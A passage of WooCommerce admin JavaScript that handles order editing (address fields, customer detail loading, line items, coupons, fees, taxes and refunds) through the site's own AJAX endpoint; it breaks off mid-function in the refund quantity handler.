// eslint-disable-next-line max-len
/*global woocommerce_admin_meta_boxes, woocommerce_admin, accounting, woocommerce_admin_meta_boxes_order, wcSetClipboard, wcClearClipboard */
jQuery( function ( $ ) {

	// Stand-in wcTracks.recordEvent in case tracks is not available (for any reason).
	window.wcTracks = window.wcTracks || {};
	window.wcTracks.recordEvent = window.wcTracks.recordEvent  || function() { };

	/**
	 * Order Data Panel
	 */
	var wc_meta_boxes_order = {
		states: null,
		init: function() {
			if (
				! (
					typeof woocommerce_admin_meta_boxes_order === 'undefined' ||
					typeof woocommerce_admin_meta_boxes_order.countries === 'undefined'
				)
			) {
				/* State/Country select boxes */
				this.states = JSON.parse( woocommerce_admin_meta_boxes_order.countries.replace( /&quot;/g, '"' ) );
			}

			$( '.js_field-country' ).selectWoo().on( 'change', this.change_country );
			$( '.js_field-country' ).trigger( 'change', [ true ] );
			$( document.body ).on( 'change', 'select.js_field-state', this.change_state );
			$( '#woocommerce-order-actions input, #woocommerce-order-actions a' ).on( 'click', function() {
				window.onbeforeunload = '';
			});
			$( 'a.edit_address' ).on( 'click', this.edit_address );
			$( 'a.billing-same-as-shipping' ).on( 'click', this.copy_billing_to_shipping );
			$( 'a.load_customer_billing' ).on( 'click', this.load_billing );
			$( 'a.load_customer_shipping' ).on( 'click', this.load_shipping );
			$( '#customer_user' ).on( 'change', this.change_customer_user );
		},

		change_country: function( e, stickValue ) {
			// Check for stickValue before using it
			if ( typeof stickValue === 'undefined' ){
				stickValue = false;
			}

			// Prevent if we don't have the metabox data
			if ( wc_meta_boxes_order.states === null ){
				return;
			}

			var $this = $( this ),
				country = $this.val(),
				$state = $this.parents( 'div.edit_address' ).find( ':input.js_field-state' ),
				$parent = $state.parent(),
				stateValue = $state.val(),
				input_name = $state.attr( 'name' ),
				input_id = $state.attr( 'id' ),
				value = $this.data( 'woocommerce.stickState-' + country ) ? $this.data( 'woocommerce.stickState-' + country ) : stateValue,
				placeholder = $state.attr( 'placeholder' ),
				$newstate;

			if ( stickValue ){
				$this.data( 'woocommerce.stickState-' + country, value );
			}

			// Remove the previous DOM element
			$parent.show().find( '.select2-container' ).remove();

			if ( ! $.isEmptyObject( wc_meta_boxes_order.states[ country ] ) ) {
				var state = wc_meta_boxes_order.states[ country ],
					$defaultOption = $( '<option value=""></option>' )
						.text( woocommerce_admin_meta_boxes_order.i18n_select_state_text );

					$newstate = $( '<select></select>' )
						.prop( 'id', input_id )
						.prop( 'name', input_name )
						.prop( 'placeholder', placeholder )
						.addClass( 'js_field-state select short' )
						.append( $defaultOption );

					$.each( state, function( index ) {
						var $option = $( '<option></option>' )
							.prop( 'value', index )
							.text( state[ index ] );
						if ( index === stateValue ) {
							$option.prop( 'selected' );
						}
						$newstate.append( $option );
					} );

				$newstate.val( value );

				$state.replaceWith( $newstate );

				$newstate.show().selectWoo().hide().trigger( 'change' );
			} else {
				$newstate = $( '<input type="text" />' )
					.prop( 'id', input_id )
					.prop( 'name', input_name )
					.prop( 'placeholder', placeholder )
					.addClass( 'js_field-state' )
					.val( stateValue );
				$state.replaceWith( $newstate );
			}

			// This event has a typo - deprecated in 2.5.0
			$( document.body ).trigger( 'contry-change.woocommerce', [country, $( this ).closest( 'div' )] );
			$( document.body ).trigger( 'country-change.woocommerce', [country, $( this ).closest( 'div' )] );
		},

		change_state: function() {
			// Here we will find if state value on a select has changed and stick it to the country data
			var $this = $( this ),
				state = $this.val(),
				$country = $this.parents( 'div.edit_address' ).find( ':input.js_field-country' ),
				country = $country.val();

			$country.data( 'woocommerce.stickState-' + country, state );
		},

		init_tiptip: function() {
			$( '#tiptip_holder' ).removeAttr( 'style' );
			$( '#tiptip_arrow' ).removeAttr( 'style' );
			$( '.tips' ).tipTip({
				'attribute': 'data-tip',
				'fadeIn': 50,
				'fadeOut': 50,
				'delay': 200,
				'keepAlive': true
			});
		},

		edit_address: function( e ) {
			e.preventDefault();

			var $this          = $( this ),
				$wrapper       = $this.closest( '.order_data_column' ),
				$edit_address  = $wrapper.find( 'div.edit_address' ),
				$address       = $wrapper.find( 'div.address' ),
				$country_input = $edit_address.find( '.js_field-country' ),
				$state_input   = $edit_address.find( '.js_field-state' ),
				is_billing     = Boolean( $edit_address.find( 'input[name^="_billing_"]' ).length );

			$address.hide();
			$this.parent().find( 'a' ).toggle();

			if ( ! $country_input.val() ) {
				$country_input.val( woocommerce_admin_meta_boxes_order.default_country ).trigger( 'change' );
				$state_input.val( woocommerce_admin_meta_boxes_order.default_state ).trigger( 'change' );
			}

			$edit_address.show();

			var event_name = is_billing ? 'order_edit_billing_address_click' : 'order_edit_shipping_address_click';
			window.wcTracks.recordEvent( event_name, {
				order_id: woocommerce_admin_meta_boxes.post_id,
				status: $( '#order_status' ).val()
			} );
		},

		change_customer_user: function() {
			if ( ! $( '#_billing_country' ).val() ) {
				$( 'a.edit_address' ).trigger( 'click' );
				wc_meta_boxes_order.load_billing( true );
				wc_meta_boxes_order.load_shipping( true );
			}
		},

		load_billing: function( force ) {
			if ( true === force || window.confirm( woocommerce_admin_meta_boxes.load_billing ) ) {

				// Get user ID to load data for
				var user_id = $( '#customer_user' ).val();

				if ( ! user_id ) {
					window.alert( woocommerce_admin_meta_boxes.no_customer_selected );
					return false;
				}

				var data = {
					user_id : user_id,
					action  : 'woocommerce_get_customer_details',
					security: woocommerce_admin_meta_boxes.get_customer_details_nonce
				};

				$( this ).closest( 'div.edit_address' ).block({
					message: null,
					overlayCSS: {
						background: '#fff',
						opacity: 0.6
					}
				});

				$.ajax({
					url: woocommerce_admin_meta_boxes.ajax_url,
					data: data,
					type: 'POST',
					success: function( response ) {
						if ( response && response.billing ) {
							$.each( response.billing, function( key, data ) {
								$( ':input#_billing_' + key ).val( data ).trigger( 'change' );
							});
						}
						$( 'div.edit_address' ).unblock();
					}
				});
			}
			return false;
		},

		load_shipping: function( force ) {
			if ( true === force || window.confirm( woocommerce_admin_meta_boxes.load_shipping ) ) {

				// Get user ID to load data for
				var user_id = $( '#customer_user' ).val();

				if ( ! user_id ) {
					window.alert( woocommerce_admin_meta_boxes.no_customer_selected );
					return false;
				}

				var data = {
					user_id:      user_id,
					action:       'woocommerce_get_customer_details',
					security:     woocommerce_admin_meta_boxes.get_customer_details_nonce
				};

				$( this ).closest( 'div.edit_address' ).block({
					message: null,
					overlayCSS: {
						background: '#fff',
						opacity: 0.6
					}
				});

				$.ajax({
					url: woocommerce_admin_meta_boxes.ajax_url,
					data: data,
					type: 'POST',
					success: function( response ) {
						if ( response && response.billing ) {
							$.each( response.shipping, function( key, data ) {
								$( ':input#_shipping_' + key ).val( data ).trigger( 'change' );
							});
						}
						$( 'div.edit_address' ).unblock();
					}
				});
			}
			return false;
		},

		copy_billing_to_shipping: function() {
			if ( window.confirm( woocommerce_admin_meta_boxes.copy_billing ) ) {
				$('.order_data_column :input[name^="_billing_"]').each( function() {
					var input_name = $(this).attr('name');
					input_name     = input_name.replace( '_billing_', '_shipping_' );
					$( ':input#' + input_name ).val( $(this).val() ).trigger( 'change' );
				});
			}
			return false;
		}
	};

	/**
	 * Order Items Panel
	 */
	var wc_meta_boxes_order_items = {
		init: function() {
			this.stupidtable.init();

			$( '#woocommerce-order-items' )
				.on( 'click', 'button.add-line-item', this.add_line_item )
				.on( 'click', 'button.add-coupon', this.add_coupon )
				.on( 'click', 'a.remove-coupon', this.remove_coupon )
				.on( 'click', 'button.refund-items', this.refund_items )
				.on( 'click', '.cancel-action', this.cancel )
				.on( 'click', '.refund-actions .cancel-action', this.track_cancel )
				.on( 'click', 'button.add-order-item', this.add_item )
				.on( 'click', 'button.add-order-fee', this.add_fee )
				.on( 'click', 'button.add-order-shipping', this.add_shipping )
				.on( 'click', 'button.add-order-tax', this.add_tax )
				.on( 'click', 'button.save-action', this.save_line_items )
				.on( 'click', 'a.delete-order-tax', this.delete_tax )
				.on( 'click', 'button.calculate-action', this.recalculate )
				.on( 'click', 'a.edit-order-item', this.edit_item )
				.on( 'click', 'a.delete-order-item', this.delete_item )

				// Refunds
				.on( 'click', '.delete_refund', this.refunds.delete_refund )
				.on( 'click', 'button.do-api-refund, button.do-manual-refund', this.refunds.do_refund )
				.on( 'change', '.refund input.refund_line_total, .refund input.refund_line_tax', this.refunds.input_changed )
				.on( 'change keyup', '.wc-order-refund-items #refund_amount', this.refunds.amount_changed )
				.on( 'change', 'input.refund_order_item_qty', this.refunds.refund_quantity_changed )

				// Qty
				.on( 'change', 'input.quantity', this.quantity_changed )

				// Subtotal/total
				.on( 'keyup change', '.split-input :input', function() {
					var $subtotal = $( this ).parent().prev().find(':input');
					if ( $subtotal && ( $subtotal.val() === '' || $subtotal.is( '.match-total' ) ) ) {
						$subtotal.val( $( this ).val() ).addClass( 'match-total' );
					}
				})

				.on( 'keyup', '.split-input :input', function() {
					$( this ).removeClass( 'match-total' );
				})

				// Meta
				.on( 'click', 'button.add_order_item_meta', this.item_meta.add )
				.on( 'click', 'button.remove_order_item_meta', this.item_meta.remove )

				// Reload items
				.on( 'wc_order_items_reload', this.reload_items )
				.on( 'wc_order_items_reloaded', this.reloaded_items );

			$( document.body )
				.on( 'wc_backbone_modal_loaded', this.backbone.init )
				.on( 'wc_backbone_modal_response', this.backbone.response );
		},

		block: function() {
			$( '#woocommerce-order-items' ).block({
				message: null,
				overlayCSS: {
					background: '#fff',
					opacity: 0.6
				}
			});
		},

		unblock: function() {
			$( '#woocommerce-order-items' ).unblock();
		},

		reload_items: function() {
			var data = {
				order_id: woocommerce_admin_meta_boxes.post_id,
				action:   'woocommerce_load_order_items',
				security: woocommerce_admin_meta_boxes.order_item_nonce
			};

			wc_meta_boxes_order_items.block();

			$.ajax({
				url:  woocommerce_admin_meta_boxes.ajax_url,
				data: data,
				type: 'POST',
				success: function( response ) {
					$( '#woocommerce-order-items' ).find( '.inside' ).empty();
					$( '#woocommerce-order-items' ).find( '.inside' ).append( response );
					wc_meta_boxes_order_items.reloaded_items();
					wc_meta_boxes_order_items.unblock();
				}
			});
		},

		reloaded_items: function() {
			wc_meta_boxes_order.init_tiptip();
			wc_meta_boxes_order_items.stupidtable.init();
		},

		// When the qty is changed, increase or decrease costs
		quantity_changed: function() {
			var $row          = $( this ).closest( 'tr.item' );
			var qty           = $( this ).val();
			var o_qty         = $( this ).attr( 'data-qty' );
			var line_total    = $( 'input.line_total', $row );
			var line_subtotal = $( 'input.line_subtotal', $row );

			// Totals
			var unit_total = accounting.unformat( line_total.attr( 'data-total' ), woocommerce_admin.mon_decimal_point ) / o_qty;
			line_total.val(
				parseFloat( accounting.formatNumber( unit_total * qty, woocommerce_admin_meta_boxes.rounding_precision, '' ) )
					.toString()
					.replace( '.', woocommerce_admin.mon_decimal_point )
			);

			var unit_subtotal = accounting.unformat( line_subtotal.attr( 'data-subtotal' ), woocommerce_admin.mon_decimal_point ) / o_qty;
			line_subtotal.val(
				parseFloat( accounting.formatNumber( unit_subtotal * qty, woocommerce_admin_meta_boxes.rounding_precision, '' ) )
					.toString()
					.replace( '.', woocommerce_admin.mon_decimal_point )
			);

			// Taxes
			$( 'input.line_tax', $row ).each( function() {
				var $line_total_tax    = $( this );
				var tax_id             = $line_total_tax.data( 'tax_id' );
				var unit_total_tax     = accounting.unformat(
					$line_total_tax.attr( 'data-total_tax' ),
					woocommerce_admin.mon_decimal_point
				) / o_qty;
				var $line_subtotal_tax = $( 'input.line_subtotal_tax[data-tax_id="' + tax_id + '"]', $row );
				var unit_subtotal_tax  = accounting.unformat(
					$line_subtotal_tax.attr( 'data-subtotal_tax' ),
					woocommerce_admin.mon_decimal_point
				) / o_qty;
				var round_at_subtotal  = 'yes' === woocommerce_admin_meta_boxes.round_at_subtotal;
				var precision          = woocommerce_admin_meta_boxes[
					round_at_subtotal ? 'rounding_precision' : 'currency_format_num_decimals'
				];

				if ( 0 < unit_total_tax ) {
					$line_total_tax.val(
						parseFloat( accounting.formatNumber( unit_total_tax * qty, precision, '' ) )
							.toString()
							.replace( '.', woocommerce_admin.mon_decimal_point )
					);
				}

				if ( 0 < unit_subtotal_tax ) {
					$line_subtotal_tax.val(
						parseFloat( accounting.formatNumber( unit_subtotal_tax * qty, precision, '' ) )
							.toString()
							.replace( '.', woocommerce_admin.mon_decimal_point )
					);
				}
			});

			$( this ).trigger( 'quantity_changed' );
		},

		add_line_item: function() {
			$( 'div.wc-order-add-item' ).slideDown();
			$( 'div.wc-order-data-row-toggle' ).not( 'div.wc-order-add-item' ).slideUp();

			window.wcTracks.recordEvent( 'order_edit_add_items_click', {
				order_id: woocommerce_admin_meta_boxes.post_id,
				status: $( '#order_status' ).val()
			} );

			return false;
		},

		add_coupon: function() {
			window.wcTracks.recordEvent( 'order_edit_add_coupon_click', {
				order_id: woocommerce_admin_meta_boxes.post_id,
				status: $( '#order_status' ).val()
			} );

			var value = window.prompt( woocommerce_admin_meta_boxes.i18n_apply_coupon );

			if ( null == value ) {
				window.wcTracks.recordEvent( 'order_edit_add_coupon_cancel', {
					order_id: woocommerce_admin_meta_boxes.post_id,
					status: $( '#order_status' ).val()
				} );
			} else {
				wc_meta_boxes_order_items.block();

				var user_id    = $( '#customer_user' ).val();
				var user_email = $( '#_billing_email' ).val();

				var data = $.extend( {}, wc_meta_boxes_order_items.get_taxable_address(), {
					action     : 'woocommerce_add_coupon_discount',
					dataType   : 'json',
					order_id   : woocommerce_admin_meta_boxes.post_id,
					security   : woocommerce_admin_meta_boxes.order_item_nonce,
					coupon     : value,
					user_id    : user_id,
					user_email : user_email
				} );

				$.ajax( {
					url:     woocommerce_admin_meta_boxes.ajax_url,
					data:    data,
					type:    'POST',
					success: function( response ) {
						if ( response.success ) {
							$( '#woocommerce-order-items' ).find( '.inside' ).empty();
								$( '#woocommerce-order-items' ).find( '.inside' ).append( response.data.html );
								wc_meta_boxes_order_items.reloaded_items();
								wc_meta_boxes_order_items.unblock();
						} else {
							window.alert( response.data.error );
						}
						wc_meta_boxes_order_items.unblock();
					},
					complete: function() {
						window.wcTracks.recordEvent( 'order_edit_added_coupon', {
							order_id: data.order_id,
							status: $( '#order_status' ).val()
						} );
					}
				} );
			}
			return false;
		},

		remove_coupon: function() {
			var $this = $( this );
			wc_meta_boxes_order_items.block();

			var data = $.extend( {}, wc_meta_boxes_order_items.get_taxable_address(), {
				action : 'woocommerce_remove_order_coupon',
				dataType : 'json',
				order_id : woocommerce_admin_meta_boxes.post_id,
				security : woocommerce_admin_meta_boxes.order_item_nonce,
				coupon : $this.data( 'code' )
			} );

			$.post( woocommerce_admin_meta_boxes.ajax_url, data, function( response ) {
				if ( response.success ) {
					$( '#woocommerce-order-items' ).find( '.inside' ).empty();
						$( '#woocommerce-order-items' ).find( '.inside' ).append( response.data.html );
						wc_meta_boxes_order_items.reloaded_items();
						wc_meta_boxes_order_items.unblock();
				} else {
					window.alert( response.data.error );
				}
				wc_meta_boxes_order_items.unblock();
			});
		},

		refund_items: function() {
			$( 'div.wc-order-refund-items' ).slideDown();
			$( 'div.wc-order-data-row-toggle' ).not( 'div.wc-order-refund-items' ).slideUp();
			$( 'div.wc-order-totals-items' ).slideUp();
			$( '#woocommerce-order-items' ).find( 'div.refund' ).show();
			$( '.wc-order-edit-line-item .wc-order-edit-line-item-actions' ).hide();

			window.wcTracks.recordEvent( 'order_edit_refund_button_click', {
				order_id: woocommerce_admin_meta_boxes.post_id,
				status: $( '#order_status' ).val()
			} );

			return false;
		},

		cancel: function() {
			$( 'div.wc-order-data-row-toggle' ).not( 'div.wc-order-bulk-actions' ).slideUp();
			$( 'div.wc-order-bulk-actions' ).slideDown();
			$( 'div.wc-order-totals-items' ).slideDown();
			$( '#woocommerce-order-items' ).find( 'div.refund' ).hide();
			$( '.wc-order-edit-line-item .wc-order-edit-line-item-actions' ).show();

			// Reload the items
			if ( 'true' === $( this ).attr( 'data-reload' ) ) {
				wc_meta_boxes_order_items.reload_items();
			}

			window.wcTracks.recordEvent( 'order_edit_add_items_cancelled', {
				order_id: woocommerce_admin_meta_boxes.post_id,
				status: $( '#order_status' ).val()
			} );

			return false;
		},

		track_cancel: function() {
			window.wcTracks.recordEvent( 'order_edit_refund_cancel', {
				order_id: woocommerce_admin_meta_boxes.post_id,
				status: $( '#order_status' ).val()
			} );
		},

		add_item: function() {
			$( this ).WCBackboneModal({
				template: 'wc-modal-add-products'
			});

			return false;
		},

		add_fee: function() {
			window.wcTracks.recordEvent( 'order_edit_add_fee_click', {
				order_id: woocommerce_admin_meta_boxes.post_id,
				status: $( '#order_status' ).val()
			} );

			var value = window.prompt( woocommerce_admin_meta_boxes.i18n_add_fee );

			if ( null == value ) {
				window.wcTracks.recordEvent( 'order_edit_add_fee_cancel', {
					order_id: woocommerce_admin_meta_boxes.post_id,
					status: $( '#order_status' ).val()
				} );
			} else {
				wc_meta_boxes_order_items.block();

				var data = $.extend( {}, wc_meta_boxes_order_items.get_taxable_address(), {
					action  : 'woocommerce_add_order_fee',
					dataType: 'json',
					order_id: woocommerce_admin_meta_boxes.post_id,
					security: woocommerce_admin_meta_boxes.order_item_nonce,
					amount  : value
				} );

				$.post( woocommerce_admin_meta_boxes.ajax_url, data, function( response ) {
					if ( response.success ) {
						$( '#woocommerce-order-items' ).find( '.inside' ).empty();
							$( '#woocommerce-order-items' ).find( '.inside' ).append( response.data.html );
							wc_meta_boxes_order_items.reloaded_items();
							wc_meta_boxes_order_items.unblock();
							window.wcTracks.recordEvent( 'order_edit_added_fee', {
								order_id: data.post_id,
								status: $( '#order_status' ).val()
							} );
					} else {
						window.alert( response.data.error );
					}
					wc_meta_boxes_order_items.unblock();
				});
			}
			return false;
		},

		add_shipping: function() {
			wc_meta_boxes_order_items.block();

			var data = {
				action   : 'woocommerce_add_order_shipping',
				order_id : woocommerce_admin_meta_boxes.post_id,
				security : woocommerce_admin_meta_boxes.order_item_nonce,
				dataType : 'json'
			};

			$.post( woocommerce_admin_meta_boxes.ajax_url, data, function( response ) {
				if ( response.success ) {
					$( 'table.woocommerce_order_items tbody#order_shipping_line_items' ).append( response.data.html );
					window.wcTracks.recordEvent( 'order_edit_add_shipping', {
						order_id: data.post_id,
						status: $( '#order_status' ).val()
					} );
				} else {
					window.alert( response.data.error );
				}
				wc_meta_boxes_order_items.unblock();
			});

			return false;
		},

		add_tax: function() {
			$( this ).WCBackboneModal({
				template: 'wc-modal-add-tax'
			});
			return false;
		},

		edit_item: function() {
			$( this ).closest( 'tr' ).find( '.view' ).hide();
			$( this ).closest( 'tr' ).find( '.edit' ).show();
			$( this ).hide();
			$( 'button.add-line-item' ).trigger( 'click' );
			$( 'button.cancel-action' ).attr( 'data-reload', true );
			window.wcTracks.recordEvent( 'order_edit_edit_item_click', {
				order_id: woocommerce_admin_meta_boxes.post_id,
				status: $( '#order_status' ).val()
			} );
			return false;
		},

		delete_item: function() {
			var notice = woocommerce_admin_meta_boxes.remove_item_notice;

			if ( $( this ).parents( 'tbody#order_fee_line_items' ).length ) {
				notice = woocommerce_admin_meta_boxes.remove_fee_notice;
			}

			if ( $( this ).parents( 'tbody#order_shipping_line_items' ).length ) {
				notice = woocommerce_admin_meta_boxes.remove_shipping_notice;
			}

			var answer = window.confirm( notice );

			if ( answer ) {
				var $item         = $( this ).closest( 'tr.item, tr.fee, tr.shipping' );
				var order_item_id = $item.attr( 'data-order_item_id' );

				wc_meta_boxes_order_items.block();

				var data = $.extend( {}, wc_meta_boxes_order_items.get_taxable_address(), {
					order_id      : woocommerce_admin_meta_boxes.post_id,
					order_item_ids: order_item_id,
					action        : 'woocommerce_remove_order_item',
					security      : woocommerce_admin_meta_boxes.order_item_nonce
				} );

				// Check if items have changed, if so pass them through so we can save them before deleting.
				if ( 'true' === $( 'button.cancel-action' ).attr( 'data-reload' ) ) {
					data.items = $( 'table.woocommerce_order_items :input[name], .wc-order-totals-items :input[name]' ).serialize();
				}

				$.ajax({
					url:     woocommerce_admin_meta_boxes.ajax_url,
					data:    data,
					type:    'POST',
					success: function( response ) {
						if ( response.success ) {
							$( '#woocommerce-order-items' ).find( '.inside' ).empty();
							$( '#woocommerce-order-items' ).find( '.inside' ).append( response.data.html );

							// Update notes.
							if ( response.data.notes_html ) {
								$( 'ul.order_notes' ).empty();
								$( 'ul.order_notes' ).append( $( response.data.notes_html ).find( 'li' ) );
							}

							wc_meta_boxes_order_items.reloaded_items();
							wc_meta_boxes_order_items.unblock();
						} else {
							window.alert( response.data.error );
						}
						wc_meta_boxes_order_items.unblock();
					},
					complete: function() {
						window.wcTracks.recordEvent( 'order_edit_remove_item', {
							order_id: data.post_id,
							status: $( '#order_status' ).val()
						} );
					}
				});
			}
			return false;
		},

		delete_tax: function() {
			if ( window.confirm( woocommerce_admin_meta_boxes.i18n_delete_tax ) ) {
				wc_meta_boxes_order_items.block();

				var data = {
					action:   'woocommerce_remove_order_tax',
					rate_id:  $( this ).attr( 'data-rate_id' ),
					order_id: woocommerce_admin_meta_boxes.post_id,
					security: woocommerce_admin_meta_boxes.order_item_nonce
				};

				$.ajax({
					url:  woocommerce_admin_meta_boxes.ajax_url,
					data: data,
					type: 'POST',
					success: function( response ) {
						if ( response.success ) {
							$( '#woocommerce-order-items' ).find( '.inside' ).empty();
								$( '#woocommerce-order-items' ).find( '.inside' ).append( response.data.html );
								wc_meta_boxes_order_items.reloaded_items();
								wc_meta_boxes_order_items.unblock();
						} else {
							window.alert( response.data.error );
						}
						wc_meta_boxes_order_items.unblock();
					},
					complete: function() {
						window.wcTracks.recordEvent( 'order_edit_delete_tax', {
							order_id: data.order_id,
							status: $( '#order_status' ).val()
						} );
					}
				});
			} else {
				window.wcTracks.recordEvent( 'order_edit_delete_tax_cancel', {
					order_id: woocommerce_admin_meta_boxes.post_id,
					status: $( '#order_status' ).val()
				} );
			}
			return false;
		},

		get_taxable_address: function() {
			var country          = '';
			var state            = '';
			var postcode         = '';
			var city             = '';

			if ( 'shipping' === woocommerce_admin_meta_boxes.tax_based_on ) {
				country  = $( '#_shipping_country' ).val();
				state    = $( '#_shipping_state' ).val();
				postcode = $( '#_shipping_postcode' ).val();
				city     = $( '#_shipping_city' ).val();
			}

			if ( 'billing' === woocommerce_admin_meta_boxes.tax_based_on || ! country ) {
				country  = $( '#_billing_country' ).val();
				state    = $( '#_billing_state' ).val();
				postcode = $( '#_billing_postcode' ).val();
				city     = $( '#_billing_city' ).val();
			}

			return {
				country:  country,
				state:    state,
				postcode: postcode,
				city:     city
			};
		},

		recalculate: function() {
			if ( window.confirm( woocommerce_admin_meta_boxes.calc_totals ) ) {
				wc_meta_boxes_order_items.block();

				var data = $.extend( {}, wc_meta_boxes_order_items.get_taxable_address(), {
					action:   'woocommerce_calc_line_taxes',
					order_id: woocommerce_admin_meta_boxes.post_id,
					items:    $( 'table.woocommerce_order_items :input[name], .wc-order-totals-items :input[name]' ).serialize(),
					security: woocommerce_admin_meta_boxes.calc_totals_nonce
				} );

				$( document.body ).trigger( 'order-totals-recalculate-before', data );

				$.ajax({
					url:  woocommerce_admin_meta_boxes.ajax_url,
					data: data,
					type: 'POST',
					success: function( response ) {
						$( '#woocommerce-order-items' ).find( '.inside' ).empty();
						$( '#woocommerce-order-items' ).find( '.inside' ).append( response );
						wc_meta_boxes_order_items.reloaded_items();
						wc_meta_boxes_order_items.unblock();

						$( document.body ).trigger( 'order-totals-recalculate-success', response );
					},
					complete: function( response ) {
						$( document.body ).trigger( 'order-totals-recalculate-complete', response );

						window.wcTracks.recordEvent( 'order_edit_recalc_totals', {
							order_id: data.post_id,
							ok_cancel: 'OK',
							status: $( '#order_status' ).val()
						} );
					}
				});
			} else {
				window.wcTracks.recordEvent( 'order_edit_recalc_totals', {
					order_id: woocommerce_admin_meta_boxes.post_id,
					ok_cancel: 'cancel',
					status: $( '#order_status' ).val()
				} );
			}

			return false;
		},

		save_line_items: function() {
			var data = {
				order_id: woocommerce_admin_meta_boxes.post_id,
				items:    $( 'table.woocommerce_order_items :input[name], .wc-order-totals-items :input[name]' ).serialize(),
				action:   'woocommerce_save_order_items',
				security: woocommerce_admin_meta_boxes.order_item_nonce
			};

			wc_meta_boxes_order_items.block();

			$.ajax({
				url:  woocommerce_admin_meta_boxes.ajax_url,
				data: data,
				type: 'POST',
				success: function( response ) {
					if ( response.success ) {
						$( '#woocommerce-order-items' ).find( '.inside' ).empty();
						$( '#woocommerce-order-items' ).find( '.inside' ).append( response.data.html );

						// Update notes.
						if ( response.data.notes_html ) {
							$( 'ul.order_notes' ).empty();
							$( 'ul.order_notes' ).append( $( response.data.notes_html ).find( 'li' ) );
						}

						wc_meta_boxes_order_items.reloaded_items();
						wc_meta_boxes_order_items.unblock();
					} else {
						wc_meta_boxes_order_items.unblock();
						window.alert( response.data.error );
					}
				},
				complete: function() {
					window.wcTracks.recordEvent( 'order_edit_save_line_items', {
						order_id: data.post_id,
						status: $( '#order_status' ).val()
					} );
				}
			});

			$( this ).trigger( 'items_saved' );

			return false;
		},

		refunds: {

			do_refund: function() {
				wc_meta_boxes_order_items.block();

				if ( window.confirm( woocommerce_admin_meta_boxes.i18n_do_refund ) ) {
					var refund_amount   = $( 'input#refund_amount' ).val();
					var refund_reason   = $( 'input#refund_reason' ).val();
					var refunded_amount = $( 'input#refunded_amount' ).val();

					// Get line item refunds
					var line_item_qtys       = {};
					var line_item_totals     = {};
					var line_item_tax_totals = {};

					$( '.refund input.refund_order_item_qty' ).each(function( index, item ) {
						if ( $( item ).closest( 'tr' ).data( 'order_item_id' ) ) {
							if ( item.value ) {
								line_item_qtys[ $( item ).closest( 'tr' ).data( 'order_item_id' ) ] = item.value;
							}
						}
					});

					$( '.refund input.refund_line_total' ).each(function( index, item ) {
						if ( $( item ).closest( 'tr' ).data( 'order_item_id' ) ) {
							line_item_totals[ $( item ).closest( 'tr' ).data( 'order_item_id' ) ] = accounting.unformat(
								item.value,
								woocommerce_admin.mon_decimal_point
							);
						}
					});

					$( '.refund input.refund_line_tax' ).each(function( index, item ) {
						if ( $( item ).closest( 'tr' ).data( 'order_item_id' ) ) {
							var tax_id = $( item ).data( 'tax_id' );

							if ( ! line_item_tax_totals[ $( item ).closest( 'tr' ).data( 'order_item_id' ) ] ) {
								line_item_tax_totals[ $( item ).closest( 'tr' ).data( 'order_item_id' ) ] = {};
							}

							line_item_tax_totals[ $( item ).closest( 'tr' ).data( 'order_item_id' ) ][ tax_id ] = accounting.unformat(
								item.value,
								woocommerce_admin.mon_decimal_point
							);
						}
					});

					var data = {
						action                : 'woocommerce_refund_line_items',
						order_id              : woocommerce_admin_meta_boxes.post_id,
						refund_amount         : refund_amount,
						refunded_amount       : refunded_amount,
						refund_reason         : refund_reason,
						line_item_qtys        : JSON.stringify( line_item_qtys, null, '' ),
						line_item_totals      : JSON.stringify( line_item_totals, null, '' ),
						line_item_tax_totals  : JSON.stringify( line_item_tax_totals, null, '' ),
						api_refund            : $( this ).is( '.do-api-refund' ),
						restock_refunded_items: $( '#restock_refunded_items:checked' ).length ? 'true': 'false',
						security              : woocommerce_admin_meta_boxes.order_item_nonce
					};

					$.ajax( {
						url:     woocommerce_admin_meta_boxes.ajax_url,
						data:    data,
						type:    'POST',
						success: function( response ) {
							if ( true === response.success ) {
								// Redirect to same page for show the refunded status
								window.location.reload();
							} else {
								window.alert( response.data.error );
								wc_meta_boxes_order_items.reload_items();
								wc_meta_boxes_order_items.unblock();
							}
						},
						complete: function() {
							window.wcTracks.recordEvent( 'order_edit_refunded', {
								order_id: data.order_id,
								status: $( '#order_status' ).val(),
								api_refund: data.api_refund,
								has_reason: Boolean( data.refund_reason.length ),
								restock: 'true' === data.restock_refunded_items
							} );
						}
					} );
				} else {
					wc_meta_boxes_order_items.unblock();
				}
			},

			delete_refund: function() {
				if ( window.confirm( woocommerce_admin_meta_boxes.i18n_delete_refund ) ) {
					var $refund   = $( this ).closest( 'tr.refund' );
					var refund_id = $refund.attr( 'data-order_refund_id' );

					wc_meta_boxes_order_items.block();

					var data = {
						action:    'woocommerce_delete_refund',
						refund_id: refund_id,
						security:  woocommerce_admin_meta_boxes.order_item_nonce
					};

					$.ajax({
						url:     woocommerce_admin_meta_boxes.ajax_url,
						data:    data,
						type:    'POST',
						success: function() {
							wc_meta_boxes_order_items.reload_items();
						}
					});
				}
				return false;
			},

			input_changed: function() {
				var refund_amount = 0;
				var $items        = $( '.woocommerce_order_items' ).find( 'tr.item, tr.fee, tr.shipping' );

				$items.each(function() {
					var $row               = $( this );
					var refund_cost_fields = $row.find( '.refund input:not(.refund_order_item_qty)' );

					refund_cost_fields.each(function( index, el ) {
						refund_amount += parseFloat( accounting.unformat( $( el ).val() || 0, woocommerce_admin.mon_decimal_point ) );
					});
				});

				$( '#refund_amount' )
					.val( accounting.formatNumber(
						refund_amount,
						woocommerce_admin_meta_boxes.currency_format_num_decimals,
						'',
						woocommerce_admin.mon_decimal_point
					) )
					.trigger( 'change' );
			},

			amount_changed: function() {
				var total = accounting.unformat( $( this ).val(), woocommerce_admin.mon_decimal_point );

				$( 'button .wc-order-refund-amount .amount' ).text( accounting.formatMoney( total, {
					symbol:    woocommerce_admin_meta_boxes.currency_format_symbol,
					decimal:   woocommerce_admin_meta_boxes.currency_format_decimal_sep,
					thousand:  woocommerce_admin_meta_boxes.currency_format_thousand_sep,
					precision: woocommerce_admin_meta_boxes.currency_format_num_decimals,
					format:    woocommerce_admin_meta_boxes.currency_format
				} ) );
			},

			// When the refund qty is changed, increase or decrease costs
			refund_quantity_changed: function() {
				var $row              = $( this ).closest( 'tr.item' );
				var qty               = $row.find( 'input.quantity' ).val();
				var refund_qty        = $( this ).val();
				var line_total        = $( 'input.line_total', $row );
				var refund_line_total = $( 'input.refund_line_total', $row );

				// Totals
